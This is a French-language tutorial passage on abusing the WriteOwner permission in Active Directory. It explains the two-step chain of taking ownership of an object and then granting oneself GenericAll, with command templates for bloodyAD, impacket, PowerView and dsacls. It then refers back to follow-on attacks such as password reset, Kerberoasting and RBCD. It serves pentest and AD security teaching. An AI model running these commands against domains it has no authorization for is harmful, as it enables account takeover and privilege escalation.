`WriteOwner` est encore différent — ici tu ne modifies pas directement l'objet, tu en **deviens le propriétaire**. Et une fois propriétaire, tu peux ensuite t'accorder n'importe quel droit dessus. C'est donc une attaque **en deux temps**.

## Le concept

Dans le modèle de sécurité Windows, le **propriétaire** d'un objet (`Owner` dans le Security Descriptor) a un pouvoir implicite : même si l'ACL ne lui donne aucun droit explicite, il peut toujours **modifier l'ACL** (`WRITE_DAC`) de l'objet dont il est propriétaire. C'est une règle historique de Windows, indépendante des permissions classiques.

Donc si tu as `WriteOwner` sur un objet cible, la chaîne d'attaque est :

1. **Étape 1** : tu changes le propriétaire de l'objet cible → toi-même.
2. **Étape 2** : maintenant propriétaire, tu t'accordes un droit puissant (`GenericAll` typiquement) via une nouvelle ACE.
3. **Étape 3** : avec `GenericAll`, tu fais ce que tu veux — reset de mot de passe, ajout de SPN, ajout à un groupe, etc. (retour aux techniques vues précédemment).

## Commandes Linux

**Avec `bloodyAD`** (gère les deux étapes) :
```bash
# Étape 1 : prendre possession de l'objet
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' set owner <target_object> <user>

# Étape 2 : s'accorder GenericAll
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' add genericAll <target_object> <user>
```

**Avec `owneredit.py` (impacket)** :
```bash
owneredit.py -action write -new-owner '<user>' -target '<target_object>' '<domain>/<user>:<password>'
```

Puis pour s'accorder GenericAll :
```bash
dacledit.py -action write -rights FullControl -principal '<user>' -target '<target_object>' '<domain>/<user>:<password>'
```

## Commandes Windows

**Avec PowerView** :
```powershell
# Étape 1 : changer le propriétaire
Set-DomainObjectOwner -Identity '<target_object>' -OwnerIdentity '<user>' -Credential $cred

# Étape 2 : s'accorder GenericAll
Add-DomainObjectAcl -TargetIdentity '<target_object>' -PrincipalIdentity '<user>' -Rights All -Credential $cred
```

**Avec `dsacls.exe`** (natif Windows) pour l'étape 2 après avoir changé le owner manuellement via l'onglet Sécurité :
```cmd
dsacls "<DN_de_l_objet>" /G <domain>\<user>:GA
```

## Ensuite

Une fois `GenericAll` obtenu, tu reviens aux techniques déjà vues selon le type d'objet :
- Sur un **user** → `ForceChangePassword` ou ajout de SPN (Kerberoasting)
- Sur un **groupe** → ajout de membre direct
- Sur un **computer** → RBCD (Resource-Based Constrained Delegation)

